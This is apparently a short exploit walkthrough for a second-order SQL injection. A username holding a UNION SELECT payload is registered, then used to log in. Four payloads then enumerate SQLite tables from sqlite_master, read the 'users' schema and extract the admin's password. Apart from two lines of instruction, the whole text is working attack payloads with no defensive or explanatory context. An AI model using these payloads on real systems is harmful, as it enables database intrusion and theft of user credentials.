Register with username contains the injection payload.
Then, login with the payload/credentials you've created.

-Format-
Username
Password

1. Test
hax' UNION SELECT id, user, post from posts where user = 'admin'; --
hax

2. Get Tables
haxx' UNION SELECT id, user, (SELECT name FROM sqlite_master WHERE type='table') from posts where user = 'admin'; --
haxx

3. Get columns of the table 'users'
haxx' UNION SELECT id, user, (SELECT sql FROM sqlite_master WHERE tbl_name = 'users' AND type = 'table') from posts where user = 'admin'; --
a

4. Get the password
haxx' UNION SELECT id, user, (SELECT pass FROM users WHERE user = 'admin') from posts where user = 'admin'; --
a
